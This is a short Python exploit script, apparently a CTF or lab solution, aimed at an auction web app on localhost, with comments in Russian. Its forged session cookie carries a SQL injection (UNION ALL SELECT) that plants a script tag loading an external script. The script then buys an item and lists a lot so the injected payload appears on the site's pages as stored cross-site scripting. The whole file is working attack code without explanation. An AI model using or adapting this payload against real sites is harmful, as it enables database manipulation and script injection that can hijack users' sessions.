import requests

URL = "http://127.0.0.1:8000/"
SCRIPT_URL = ""
COOKIE = "session_id=\"' UNION ALL SELECT 'Hacker<script src={}></script>', '', '9999999' --\"".format(SCRIPT_URL)

# получаем список лотов
r = requests.get(URL + "all_lots", headers={"Cookie": COOKIE})
buy_id = r.text.split('buy_now_id" value="')[1].split('"')[0]

# покупаем рандомный товар
r = requests.post(URL, data={'buy_now_id': buy_id}, headers={"Cookie": COOKIE}, allow_redirects=False)
print(r.text, r.headers)

# получаем список наших товаров
r = requests.get(URL + "add_lot", headers={"Cookie": COOKIE})
to_lot_id = r.text.split("click_item('")[1].split("'")[0]

# создаём лот
r = requests.post(URL, data={'id': to_lot_id, 'amount': 1, 'price_start': 1, 'price_end': 2}, headers={"Cookie": COOKIE}, allow_redirects=False)
print(r.text, r.headers)